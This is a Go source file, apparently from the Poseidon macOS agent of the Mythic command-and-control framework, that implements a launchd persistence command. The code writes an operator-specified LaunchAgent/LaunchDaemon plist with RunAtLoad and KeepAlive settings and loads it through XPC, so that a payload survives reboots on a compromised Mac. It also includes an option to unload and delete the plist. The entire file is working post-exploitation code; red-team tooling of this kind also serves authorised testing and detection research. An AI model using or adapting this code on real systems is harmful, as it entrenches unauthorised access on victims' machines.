package persist_launchd

import (
	// Standard
	"bufio"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
	"os"
	"strings"

	// External
	"howett.net/plist"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

func runCommand(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	if args.Path[0] == '~' {
		if functions.GetUser() == "root" {
			msg.SetError("Can't use ~ with root user. Please specify an absolute path.")
			task.Job.SendResponses <- msg
			return
		}
		args.Path = strings.Replace(args.Path, "~", fmt.Sprintf("/Users/%s", functions.GetUser()), 1)
	}
	if args.Remove {
		response := xpc.XpcLaunchUnloadPlist(args.Path)
		raw, _ := json.MarshalIndent(response, "", "	")
		errorDict, exists := response["errors"]
		if exists {
			errorMap := errorDict.(xpc.Dict)
			if len(errorMap) > 0 {
				msg.SetError(string(raw))
				task.Job.SendResponses <- msg
				return
			}

		}
		bootstrapError, exists := response["bootstrap-error"]
		if exists {
			bootstrapErrorCode := bootstrapError.(int64)
			if bootstrapErrorCode > 0 {
				msg.SetError(string(raw))
				task.Job.SendResponses <- msg
				return
			}

		}
		bootoutError, exists := response["bootout-error"]
		if exists {
			bootoutErrorCode := bootoutError.(int64)
			if bootoutErrorCode > 0 {
				msg.SetError(string(raw))
				task.Job.SendResponses <- msg
				return
			}
		}
		err = os.Remove(args.Path)
		if err != nil {
			msg.SetError(err.Error())
		} else {
			msg.UserOutput = "Removed file"
			msg.Completed = true
			msg.RemovedFiles = &[]structs.RmFiles{
				{
					Path: args.Path,
				},
			}
		}
		task.Job.SendResponses <- msg
		return
	}
	var argArray []string
	argArray = append(argArray, args.ProgramArgs...)
	data := &launchPlist{
		Label:            args.Label,
		ProgramArguments: argArray,
		RunAtLoad:        args.RunAtLoad,
		KeepAlive:        args.KeepAlive,
	}
	plistContents, err := plist.MarshalIndent(data, plist.XMLFormat, "\t")
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	f, err := os.Create(args.Path)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	// report the creation of our new file on disk
	msg.Artifacts = &[]structs.Artifact{
		{
			BaseArtifact: "FileCreate",
			Artifact:     args.Path,
		},
	}
	defer f.Close()
	w := bufio.NewWriter(f)
	_, err = w.WriteString(string(plistContents))

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	w.Flush()
	response := xpc.XpcLaunchLoadPlist(args.Path)
	msg.Completed = true
	msg.UserOutput = "Launchd persistence file created\nLoading via xpc...\n"
	raw, _ := json.MarshalIndent(response, "", "	")
	errorDict, exists := response["errors"]
	if exists {
		errorMap := errorDict.(xpc.Dict)
		if len(errorMap) > 0 {
			msg.SetError(msg.UserOutput + string(raw))
			task.Job.SendResponses <- msg
			return
		}

	}
	errorCode, exists := response["bootstrap-error"]
	if exists && errorCode.(int64) > 0 {
		msg.SetError(msg.UserOutput + string(raw))
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput += "Successfully loaded:\n" + string(raw)

	task.Job.SendResponses <- msg
	return
}
